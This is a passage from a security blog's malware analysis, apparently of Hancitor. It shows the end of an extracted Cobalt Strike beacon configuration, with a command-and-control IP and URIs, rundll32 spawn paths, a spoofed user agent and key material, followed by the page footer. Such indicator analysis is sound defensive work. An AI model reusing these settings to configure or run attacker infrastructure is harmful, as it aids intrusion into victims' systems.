80</span><br><span class="line">0x0003 sleeptime                        0x0002 0x0004 60000</span><br><span class="line">0x0004 maxgetsize                       0x0002 0x0004 1048576</span><br><span class="line">0x0005 jitter                           0x0001 0x0002 0</span><br><span class="line">0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d0030818902818100a70991d69d816a601ffa80976473830f0d3b41276d2790401ddedb18e2d3cab3c315e3222325be42b65adb2878f33f5a03ff5010b23e842a510c1482ad6a42f1e7e5726eb31813e7437640ed7879955f401e172c34d3517241596dd41f8e48d3d1b1c288e6c8752ff65dc27acccba4ba9cd6d0e4de6196cea4da480d3b99d0ed020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Has known private key</span><br><span class="line">0x0008 server,get-uri                   0x0003 0x0100 &#x27;104.128.232.37,/updates.rss&#x27;</span><br><span class="line">0x0043                                  0x0001 0x0002 0</span><br><span class="line">0x0044                                  0x0002 0x0004 4294967295</span><br><span class="line">0x0045                                  0x0002 0x0004 4294967295</span><br><span class="line">0x0046                                  0x0002 0x0004 4294967295</span><br><span class="line">0x000e SpawnTo                          0x0003 0x0010 (NULL ...)</span><br><span class="line">0x001d spawnto_x86                      0x0003 0x0040 &#x27;%windir%\\syswow64\\rundll32.exe&#x27;</span><br><span class="line">0x001e spawnto_x64                      0x0003 0x0040 &#x27;%windir%\\sysnative\\rundll32.exe&#x27;</span><br><span class="line">0x001f CryptoScheme                     0x0001 0x0002 0</span><br><span class="line">0x001a get-verb                         0x0003 0x0010 &#x27;GET&#x27;</span><br><span class="line">0x001b post-verb                        0x0003 0x0010 &#x27;POST&#x27;</span><br><span class="line">0x001c HttpPostChunk                    0x0002 0x0004 0</span><br><span class="line">0x0025 license-id                       0x0002 0x0004 1580103824 Stats uniques -&gt; ips/hostnames: 42 publickeys: 10</span><br><span class="line">0x0026 bStageCleanup                    0x0001 0x0002 0</span><br><span class="line">0x0027 bCFGCaution                      0x0001 0x0002 0</span><br><span class="line">0x0009 useragent                        0x0003 0x0100 &#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)&#x27;</span><br><span class="line">0x000a post-uri                         0x0003 0x0040 &#x27;/submit.php&#x27;</span><br><span class="line">0x000b Malleable_C2_Instructions        0x0003 0x0100 &#x27;\x00\x00\x00\x04&#x27;</span><br><span class="line">0x000c http_get_header                  0x0003 0x0200</span><br><span class="line">  Cookie</span><br><span class="line">0x000d http_post_header                 0x0003 0x0200</span><br><span class="line">  &amp;Content-Type: application/octet-stream</span><br><span class="line">  id</span><br><span class="line">0x0036 HostHeader                       0x0003 0x0080 (NULL ...)</span><br><span class="line">0x0032 UsesCookies                      0x0001 0x0002 1</span><br><span class="line">0x0023 proxy_type                       0x0001 0x0002 2 IE settings</span><br><span class="line">0x003a                                  0x0003 0x0080 &#x27;\x00\x04&#x27;</span><br><span class="line">0x0039                                  0x0003 0x0080 &#x27;\x00\x04&#x27;</span><br><span class="line">0x0037                                  0x0001 0x0002 0</span><br><span class="line">0x0028 killdate                         0x0002 0x0004 0</span><br><span class="line">0x0029 textSec</span><br></pre></td></tr></table></figure>
+
+</p><div class="tip">本文采用CC-BY-SA-3.0协议，转载请注明出处<br>Author: scr1pt</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-28</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 2470 words, 8 min 13 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://Scr1pt-kid.github.io/2022/04/28/2021-12-16-hancitor/,scr1pt's blog,2021-12-16-hancitor,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/04/18/anti-hook/" title="anti-hook">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>
